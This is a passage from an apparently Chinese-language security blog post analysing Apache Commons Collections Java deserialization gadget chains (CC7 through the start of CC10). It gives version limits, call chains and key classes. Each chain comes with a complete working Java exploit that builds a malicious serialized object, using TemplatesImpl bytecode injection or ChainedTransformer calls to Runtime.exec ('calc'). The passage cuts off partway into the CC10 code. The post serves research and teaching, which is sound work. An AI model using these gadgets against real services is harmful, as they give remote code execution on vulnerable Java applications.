class="hljs-keyword">new</span> java.io.StreamCorruptedException();<br>    &#125;<br>    <span class="hljs-comment">// Makes sure the key is not already in the hashtable.</span><br>    <span class="hljs-comment">// This should not happen in deserialized version.</span><br>    <span class="hljs-keyword">int</span> hash = key.hashCode();<br>    <span class="hljs-keyword">int</span> index = (hash &amp; <span class="hljs-number">0x7FFFFFFF</span>) % tab.length;<br>    <span class="hljs-keyword">for</span> (Entry&lt;?,?&gt; e = tab[index] ; e != <span class="hljs-keyword">null</span> ; e = e.next) &#123;<br>        <span class="hljs-keyword">if</span> ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> java.io.StreamCorruptedException();<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">// Creates the new entry.</span><br>    <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>        Entry&lt;K,V&gt; e = (Entry&lt;K,V&gt;)tab[index];<br>    tab[index] = <span class="hljs-keyword">new</span> Entry&lt;&gt;(hash, key, value, e);<br>    count++;<br>&#125;<br></code></pre></td></tr></table></figure><p>第一次添加元素时，显然 for 中的 if 是不满足的，因此要添加两次，值为<code>yy zZ</code>，因为<code>e.hash==hash</code>是 hashCode 算法导致的 hash 冲突</p><p>第三个，<code>decorate</code>封装的 innermap 不能是同一个<code>HashMap</code></p><p>第四个，最后还要移除 map2 的 yy 键</p><p>在没有移除这个键的时候调试发现确实 map2 多出来了这个键</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20221005230840200.png"></p><p>前面提到过，<code>LazyMap</code>的<code>map</code>属性为<code>HashMap</code>对象时，其新增的元素是存储在<code>HashMap.Node</code>内部类中的，而我们向<code>LazyMap</code>put 了一组 hash 冲突的键(这个两个键然后存储在<code>HashMap.Node</code>)，这就涉及到了<code>HashMap</code>如何处理 hash 冲突的了</p><p>我们看一下<code>LazyMap.put-&gt;HashMap.put</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> V <span class="hljs-title">put</span><span class="hljs-params">(K key, V value)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (table == EMPTY_TABLE) &#123;<br>        inflateTable(threshold);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (key == <span class="hljs-keyword">null</span>)<br>        <span class="hljs-keyword">return</span> putForNullKey(value);<br>    <span class="hljs-keyword">int</span> hash = hash(key);<br>    <span class="hljs-keyword">int</span> i = indexFor(hash, table.length);<br>    <span class="hljs-keyword">for</span> (Entry&lt;K,V&gt; e = table[i]; e != <span class="hljs-keyword">null</span>; e = e.next) &#123;<br>        Object k;<br>        <span class="hljs-keyword">if</span> (e.hash == hash &amp;&amp; ((k = e.key) == key || key.equals(k))) &#123;<br>            V oldValue = e.value;<br>            e.value = value;<br>            e.recordAccess(<span class="hljs-keyword">this</span>);<br>            <span class="hljs-keyword">return</span> oldValue;<br>        &#125;<br>    &#125;<br><br>    modCount++;<br>    addEntry(hash, key, value, i);<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">addEntry</span><span class="hljs-params">(<span class="hljs-keyword">int</span> hash, K key, V value, <span class="hljs-keyword">int</span> bucketIndex)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> ((size &gt;= threshold) &amp;&amp; (<span class="hljs-keyword">null</span> != table[bucketIndex])) &#123;<br>        resize(<span class="hljs-number">2</span> * table.length);<br>        hash = (<span class="hljs-keyword">null</span> != key) ? hash(key) : <span class="hljs-number">0</span>;<br>        bucketIndex = indexFor(hash, table.length);<br>    &#125;<br><br>    createEntry(hash, key, value, bucketIndex);<br>&#125;<br></code></pre></td></tr></table></figure><p>这里可知是通过单向链表解决的</p><blockquote><p><a href="https://blog.csdn.net/weixin_72753070/article/details/126120740">https://blog.csdn.net/weixin_72753070/article/details/126120740</a></p><p>版本应该不一样，了解即可</p><p>系统总是将新添加的 Entry 对象放入 table 数组的 bucketIndex 索引处——如果 bucketIndex 索引处已经有了一个 Entry 对象，那新添加的 Entry 对象指向原有的 Entry 对象（产生一个 Entry 链），如果 bucketIndex 索引处没有 Entry 对象，也就是上面程序代码的 e 变量是 null，也就是新放入的 Entry 对象指向 null，也就是没有产生 Entry 链</p><p>HashMap 里面没有出现 hash 冲突时，没有形成单链表时，hashmap 查找元素很快,get()方法能够直接定位到元素，但是出现单链表后，单个 bucket 里存储的不是一个 Entry，而是一个 Entry 链，系统只能必须按顺序遍历每个 Entry，直到找到想搜索的 Entry 为止——如果恰好要搜索的 Entry 位于该 Entry 链的最末端（该 Entry 是最早放入该 bucket 中），那系统必须循环到最后才能找到该元素</p><p>当创建 HashMap 时，有一个默认的负载因子（load factor），其默认值为 0.75，这是时间和空间成本上一种折衷：增大负载因子可以减少 Hash 表（就是那个 Entry 数组）所占用的内存空间，但会增加查询数据的时间开销，而查询是最频繁的的操作（HashMap 的 get() 与 put() 方法都要用到查询）；减小负载因子会提高数据查询的性能，但会增加 Hash 表所占用的内存空间</p></blockquote><p><a href="https://www.anquanke.com/post/id/190468">https://www.anquanke.com/post/id/190468</a></p><p><a href="https://www.anquanke.com/post/id/190472">https://www.anquanke.com/post/id/190472</a></p><p><a href="https://forum.butian.net/share/120">https://forum.butian.net/share/120</a></p><h2 id="CommonsCollections8"><a href="#CommonsCollections8" class="headerlink" title="CommonsCollections8"></a>CommonsCollections8</h2><h3 id="Pre-7"><a href="#Pre-7" class="headerlink" title="Pre"></a>Pre</h3><h4 id="限制-7"><a href="#限制-7" class="headerlink" title="限制"></a>限制</h4><blockquote><p>jdk 暂无限制</p><p>CommonsCollections 4.0</p></blockquote><h4 id="利用链-7"><a href="#利用链-7" class="headerlink" title="利用链"></a>利用链</h4><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs stylus">org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span><span class="hljs-selector-class">.collections4</span><span class="hljs-selector-class">.bag</span><span class="hljs-selector-class">.TreeBag</span><span class="hljs-selector-class">.readObject</span><br>org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span><span class="hljs-selector-class">.collections4</span><span class="hljs-selector-class">.bag</span><span class="hljs-selector-class">.AbstractMapBag</span><span class="hljs-selector-class">.doReadObject</span><br>java<span class="hljs-selector-class">.util</span><span class="hljs-selector-class">.TreeMap</span><span class="hljs-selector-class">.put</span><br>java<span class="hljs-selector-class">.util</span><span class="hljs-selector-class">.TreeMap</span><span class="hljs-selector-class">.compare</span><br>org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span><span class="hljs-selector-class">.collections4</span><span class="hljs-selector-class">.comparators</span><span class="hljs-selector-class">.TransformingComparator</span><span class="hljs-selector-class">.compare</span><br>org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span><span class="hljs-selector-class">.collections4</span><span class="hljs-selector-class">.functors</span><span class="hljs-selector-class">.InvokerTransformer</span><span class="hljs-selector-class">.transform</span><br>java<span class="hljs-selector-class">.lang</span><span class="hljs-selector-class">.reflect</span><span class="hljs-selector-class">.Method</span><span class="hljs-selector-class">.invoke</span><br>sun<span class="hljs-selector-class">.reflect</span><span class="hljs-selector-class">.DelegatingMethodAccessorImpl</span><span class="hljs-selector-class">.invoke</span><br>sun<span class="hljs-selector-class">.reflect</span><span class="hljs-selector-class">.NativeMethodAccessorImpl</span><span class="hljs-selector-class">.invoke</span><br>sun<span class="hljs-selector-class">.reflect</span><span class="hljs-selector-class">.NativeMethodAccessorImpl</span><span class="hljs-selector-class">.invoke0</span><br>com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.org</span><span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.xalan</span><span class="hljs-selector-class">.internal</span><span class="hljs-selector-class">.xsltc</span><span class="hljs-selector-class">.trax</span><span class="hljs-selector-class">.TemplatesImpl</span><span class="hljs-selector-class">.newTransformer</span><br>    ... (TemplatesImpl gadget)<br>java<span class="hljs-selector-class">.lang</span><span class="hljs-selector-class">.Runtime</span>.exec<br></code></pre></td></tr></table></figure><h4 id="关键类-7"><a href="#关键类-7" class="headerlink" title="关键类"></a>关键类</h4><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">TreeBag</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">ClassPool</span><br><span class="hljs-attribute">CtClass</span><br><span class="hljs-attribute">AbstractTranslet</span><br><span class="hljs-attribute">TemplatesImpl</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">TransformingComparator</span><br><span class="hljs-attribute">InvokerTransformer</span><br></code></pre></td></tr></table></figure><p>与 CC2、CC4 的区别在于使用了新的触发点 TreeBag</p><h3 id="Gadget-7"><a href="#Gadget-7" class="headerlink" title="Gadget"></a>Gadget</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsCollections.CC8;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> javassist.*;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.bag.TreeBag;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC8</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setFieldValue</span> <span class="hljs-params">(Object o, String fieldName,Object value)</span> </span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Class clz = o.getClass();<br>            Field declaredField = clz.getDeclaredField(fieldName);<br>            declaredField.setAccessible(<span class="hljs-keyword">true</span>);<br>            declaredField.set(o,value);<br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException | IllegalAccessException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> RuntimeException(e);<br>        &#125;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> CannotCompileException, NotFoundException, IOException, ClassNotFoundException </span>&#123;<br>        ClassPool cp = ClassPool.getDefault();<br>        cp.insertClassPath(<span class="hljs-keyword">new</span> ClassClassPath(AbstractTranslet.class));<br>        CtClass ctc = cp.makeClass(<span class="hljs-string">&quot;Evil&quot;</span>);<br>        String cmd = <span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>;<br>        ctc.makeClassInitializer().insertBefore(cmd);<br>        ctc.setSuperclass(cp.get(AbstractTranslet.class.getName()));<br>        <span class="hljs-keyword">byte</span>[] classbytes = ctc.toBytecode();<br>        <span class="hljs-keyword">byte</span>[][] targetclassbytes = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]&#123;classbytes&#125;;<br>        TemplatesImpl templatesimpl = <span class="hljs-keyword">new</span> TemplatesImpl();<br>        setFieldValue(templatesimpl,<span class="hljs-string">&quot;_name&quot;</span>,<span class="hljs-string">&quot;a&quot;</span>);<br>        setFieldValue(templatesimpl,<span class="hljs-string">&quot;_bytecodes&quot;</span>,targetclassbytes);<br><br>        InvokerTransformer invokerTransformer = <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;toString&quot;</span>, <span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>);<br>        TransformingComparator transformingComparator = <span class="hljs-keyword">new</span> TransformingComparator(invokerTransformer);<br>        TreeBag treeBag = <span class="hljs-keyword">new</span> TreeBag(transformingComparator);<br>        treeBag.add(templatesimpl);<br>        setFieldValue(invokerTransformer,<span class="hljs-string">&quot;iMethodName&quot;</span>,<span class="hljs-string">&quot;newTransformer&quot;</span>);<br><br>        ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(baos);<br>        oos.writeObject(treeBag);<br>        oos.close();<br><br>        ByteArrayInputStream bais = <span class="hljs-keyword">new</span> ByteArrayInputStream(baos.toByteArray());<br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(bais);<br>        ois.readObject();<br>        ois.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="CommonsCollections9"><a href="#CommonsCollections9" class="headerlink" title="CommonsCollections9"></a>CommonsCollections9</h2><h3 id="Pre-8"><a href="#Pre-8" class="headerlink" title="Pre"></a>Pre</h3><h4 id="限制-8"><a href="#限制-8" class="headerlink" title="限制"></a>限制</h4><blockquote><p>jdk 暂无限制</p><p>CommonsCollections 3.1-3.2.1</p></blockquote><h4 id="利用链-8"><a href="#利用链-8" class="headerlink" title="利用链"></a>利用链</h4><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ObjectInputStream</span>.</span></span>read<span class="hljs-constructor">Object()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">AnnotationInvocationHandler</span>.</span></span>read<span class="hljs-constructor">Object()</span> <span class="hljs-comment">//??BadAttributeValueExpException</span><br><span class="hljs-constructor">Map(Proxy)</span>.entry<span class="hljs-constructor">Set()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">AnnotationInvocationHandler</span>.</span></span>invoke<span class="hljs-literal">()</span><span class="hljs-comment">//?? BadAttributeValueExpException</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">DefaultedMap</span>.</span></span>get<span class="hljs-literal">()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ChainedTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ConstantTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Method</span>.</span></span>invoke<span class="hljs-literal">()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span>get<span class="hljs-constructor">Method()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Method</span>.</span></span>invoke<span class="hljs-literal">()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>get<span class="hljs-constructor">Runtime()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Method</span>.</span></span>invoke<span class="hljs-literal">()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>exec<span class="hljs-literal">()</span><br><br></code></pre></td></tr></table></figure><h4 id="关键类-8"><a href="#关键类-8" class="headerlink" title="关键类"></a>关键类</h4><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">DefaultedMap</span><br><span class="hljs-attribute">TiedMapEntry</span><br><span class="hljs-attribute">BadAttributeValueExpException</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">Transformer</span><br><span class="hljs-attribute">ConstantTransformer</span><br><span class="hljs-attribute">InvokerTransformer</span><br><span class="hljs-attribute">ChainedTransformer</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">HashMap</span><br></code></pre></td></tr></table></figure><p>梅子酒师傅提交的 CommonsCollections9，主要利用的是 CommonsCollections:3.2 版本新增的 DefaultedMap 来代替 LazyMap，因为这两个 Map 有同样的 get 函数可以被利用</p><h3 id="Gadget-8"><a href="#Gadget-8" class="headerlink" title="Gadget"></a>Gadget</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsCollections.CC9;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.DefaultedMap;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC9</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setFieldValue</span><span class="hljs-params">(Object o, String fieldName, Object value)</span> </span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Class clz = o.getClass();<br>            Field declaredFiled = clz.getDeclaredField(fieldName);<br>            declaredFiled.setAccessible(<span class="hljs-keyword">true</span>);<br>            declaredFiled.set(o, value);<br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException | IllegalAccessException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> RuntimeException(e);<br>        &#125;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException </span>&#123;<br>        Transformer[] transformers = &#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        ChainedTransformer fakechainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]&#123;<span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>)&#125;);<br>        HashMap hm = <span class="hljs-keyword">new</span> HashMap();<br>        Map decorate = DefaultedMap.decorate(hm,fakechainedTransformer);<br>        TiedMapEntry tiedMapEntry = <span class="hljs-keyword">new</span> TiedMapEntry(decorate,<span class="hljs-string">&quot;a&quot;</span>);<br>        setFieldValue(fakechainedTransformer,<span class="hljs-string">&quot;iTransformers&quot;</span>,transformers);<br>        BadAttributeValueExpException badAttributeValueExpException = <span class="hljs-keyword">new</span> BadAttributeValueExpException(<span class="hljs-keyword">null</span>);<br>        setFieldValue(badAttributeValueExpException,<span class="hljs-string">&quot;val&quot;</span>,tiedMapEntry);<br><br>        ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(baos);<br>        oos.writeObject(badAttributeValueExpException);<br>        oos.close();<br><br>        ByteArrayInputStream bais = <span class="hljs-keyword">new</span> ByteArrayInputStream(baos.toByteArray());<br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(bais);<br>        ois.readObject();<br>        ois.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="CommonsCollections10"><a href="#CommonsCollections10" class="headerlink" title="CommonsCollections10"></a>CommonsCollections10</h2><h3 id="Pre-9"><a href="#Pre-9" class="headerlink" title="Pre"></a>Pre</h3><h4 id="限制-9"><a href="#限制-9" class="headerlink" title="限制"></a>限制</h4><blockquote><p>jdk 暂无限制</p><p>CommonsCollections 3.1 - 3.2.1</p></blockquote><h4 id="利用链-9"><a href="#利用链-9" class="headerlink" title="利用链"></a>利用链</h4><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs livescript">Hashtable.readObject<span class="hljs-function"><span class="hljs-params">()</span></span><br><span class="hljs-function">    -&gt;</span> Hashtable.reconstitutionPut<br>    -&gt; key.hashCode<span class="hljs-function"><span class="hljs-params">()</span> =&gt; <span class="hljs-title">TiedMapEntry</span>.<span class="hljs-title">hashCode</span><span class="hljs-params">()</span></span><br><span class="hljs-function">    -&gt;</span> TiedMapEntry.getValue<br>    -&gt; TiedMapEntry.<span class="hljs-keyword">map</span>.get<span class="hljs-function"><span class="hljs-params">()</span> =&gt; <span class="hljs-title">LazyMap</span>.<span class="hljs-title">get</span><span class="hljs-params">()</span></span><br><span class="hljs-function">    -&gt;</span> factory.transform<span class="hljs-function"><span class="hljs-params">()</span> =&gt; <span class="hljs-title">ChainedTransformer</span>.<span class="hljs-title">transform</span><span class="hljs-params">()</span></span><br><span class="hljs-function">    -&gt;</span> Runtime.getRuntime().exec()<br></code></pre></td></tr></table></figure><h4 id="关键类-9"><a href="#关键类-9" class="headerlink" title="关键类"></a>关键类</h4><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">TiedMapEntry</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">Transformer</span><br><span class="hljs-attribute">ConstantTransformer</span><br><span class="hljs-attribute">InvokerTransformer</span><br><span class="hljs-attribute">ChainedTransformer</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">HashMap</span><br><span class="hljs-attribute">LazyMap</span><br><span class="hljs-attribute">Hashtable</span><br></code></pre></td></tr></table></figure><h3 id="Gadget-9"><a href="#Gadget-9" class="headerlink" title="Gadget"></a>Gadget</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsCollections.CC10;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> 